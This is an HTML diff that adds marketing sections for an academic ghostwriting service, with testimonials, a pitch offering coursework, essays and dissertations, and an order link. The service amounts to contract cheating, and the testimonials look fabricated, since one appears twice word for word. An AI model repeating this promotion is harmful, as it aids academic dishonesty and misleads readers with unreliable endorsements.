-        <p>
-            The site uses cookies. They allow us to recognize you and get information about your user experience.By continuing to browse the site, I agree to the use of cookies by the site owner in accordance with  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Cookie policy</a>
-        </p>
-        <button class='close-cookie'>&times;</button>
-    </div>
-    <script>
-        window.onload = function() {
-            $('.close-cookie').click(function () {
-                $('.cookie-banner').fadeOut();
-            })
-        }
-    </script>
-</body>
+    <section class="ftco-section testimony-section bg-light">
+    	<div class="overlay"></div>
+      <div class="container">
+        <div class="row justify-content-center pb-5 mb-3">
+          <div class="col-md-7 heading-section heading-section-white text-center ftco-animate">
+          	<span class="subheading">Testimonies</span>
+            <h2>Happy Clients &amp; Feedbacks</h2>
+          </div>
+        </div>
+        <div class="row ftco-animate">
+          <div class="col-md-12">
+            <div class="carousel-testimony owl-carousel ftco-owl">
+              <div class="item">
+                <div class="testimony-wrap py-4">
+                	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-quote-left"></span></div>
+                  <div class="text">
+                    <p class="mb-4">"Thank you for the services. I did have to request for revision, and ask for sources review. Like ur free revision option, it guarantees that the instructions would be followed in the final paper."</p>
+                    <div class="d-flex align-items-center">
+
+                    	<div class="pl-3">
+
+
+		                  </div>
+	                  </div>
+                  </div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="testimony-wrap py-4">
+                  <div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-quote-left"></span></div>
+                  <div class="text">
+                    <p class="mb-4">"Very good work and affordable prices. Others charge extra for nothing, all those additional services are nothing. Thank you for real client oriented services!"</p>
+                    <div class="d-flex align-items-center">
+
+                      <div class="pl-3">
+
+
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="testimony-wrap py-4">
+                  <div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-quote-left"></span></div>
+                  <div class="text">
+                    <p class="mb-4">"Thank you for the services. I did have to request for revision, and ask for sources review. Like ur free revision option, it guarantees that the instructions would be followed in the final paper."</p>
+                    <div class="d-flex align-items-center">
+
+                      <div class="pl-3">
+
+
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="testimony-wrap py-4">
+                  <div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-quote-left"></span></div>
+                  <div class="text">
+                    <p class="mb-4">"First but not last! Thank you for my coursework, I already thought that I'd fail. You successfully completed my 15 page coursework on Ethics and I have more to come. I do believe that your professional writers are capable to do anything. "</p>
+                    <div class="d-flex align-items-center">
+
+                      <div class="pl-3">
+
+
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="testimony-wrap py-4">
+                  <div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-quote-left"></span></div>
+                  <div class="text">
+                    <p class="mb-4">"I usually complete the tasks myself. But sometimes there are those ridiculous assignments, good for nothing but a waste of time. I have lots of other work to take care of. And when I get such assignments, I know where to look for help. Thank you and all your writers."</p>
+                    <div class="d-flex align-items-center">
+
+                      <div class="pl-3">
+
+
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="ftco-section ftco-no-pt bg-light ftco-faqs">
+    	<div class="container">
+    		<div class="row">
+    			<div class="col-lg-6">
+    				<div class="img-faqs w-100">
+	    				<div class="img mb-4 mb-sm-0" style="background-image:url(images/222.jpg);">
+	    				</div>
+	    				<div class="img img-2 mb-4 mb-sm-0" style="background-image:url(images/111.jpg);">
+	    				</div>
+	    			</div>
+    			</div>
+    			<div class="col-lg-6 pl-lg-5">
+    				<div class="heading-section mb-5 mt-5 mt-lg-0">
+
+	            <h2 class="mb-3">Why Get Custom-Written</h2>
+	            <p>Welcome to a professional academic paper company. Our team has been solving educational problems of students for many productive years. We provide a broad array of affordable custom writing services by qualified writers. That includes but is not limited to help with an admission essay, research papers on any topics, coursework, book and lab reports, and even a full dissertation (or its separate chapters). Also, your academic level and the subject don't influence the quality of the paper at all. And it's all thanks to our highly competent team of custom writing wizards we've gathered over the years of providing writing and editing assistance. If you are unsure about the results, please check out our samples (in the appropriate section) to rule out any uncertainties. </p>
+    				</div>
+    				<div id="accordion" class="myaccordion w-100" aria-multiselectable="true">
+						  <div class="card">
+						    <div class="card-header p-0" id="headingOne">
+						      <h2 class="mb-0">
+						       <p><a href="https://www.bestcustomwriting.com/?__utmla=27b54a40d7e6c27e7f3b5d667b6ac3ed" class="btn btn-white">PLACE AN ORDER</a></p>
+						        </button>
+						      </h2>
+						    </div>
+
+						    </div>
+						  </div>
+						</div>
+	        </div>
+        </div>
+    	</div>
+    </section>
+
+
+
+
+    <section class="ftco-section ftco-no-pb ftco-no-pt bg-secondary">
+      <div class="container py-5">
+    		<div class="row">
+          <div class="col-md-7 d-flex align-items-center">
+            <h2 class="mb-3 mb-sm-0" style="color:black; font-size: 22px;">Sign Up for Your Free 1st BestCustomWriting Consultation</h2>
+          </div>
+          <div class="col-md-5 d-flex align-items-center">
+            <form action="#" class="subscribe-form">
+              <div class="form-group d-flex">
+                <input type="text" class="form-control" placeholder="Enter email address">
+                <input type="submit" value="Subscribe" class="submit px-3">
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+
+
+
+
+
+  <!-- loader -->
+  <div id="ftco-loader" class="show fullscreen"><svg class="circular" width="48px" height="48px"><circle class="path-bg" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke="#eeeeee"/><circle class="path" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke-miterlimit="10" stroke="#F96D00"/></svg></div>
+
+
+  <script src="js/jquery.min.js"></script>
+  <script src="js/jquery-migrate-3.0.1.min.js"></script>
+  <script src="js/popper.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/jquery.easing.1.3.js"></script>
+  <script src="js/jquery.waypoints.min.js"></script>
+  <script src="js/jquery.stellar.min.js"></script>
+  <script src="js/jquery.animateNumber.min.js"></script>
+  <script src="js/owl.carousel.min.js"></script>
+  <script src="js/jquery.magnific-popup.min.js"></script>
+  <script src="js/scrollax.min.js"></script>
+  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBVWaKrjvy3MaE7SQ74_uJiULgl1JY0H2s&sensor=false"></script>
+  <script src="js/google-map.js"></script>
+  <script src="js/main.js"></script>
+
+  </body>
+</html>
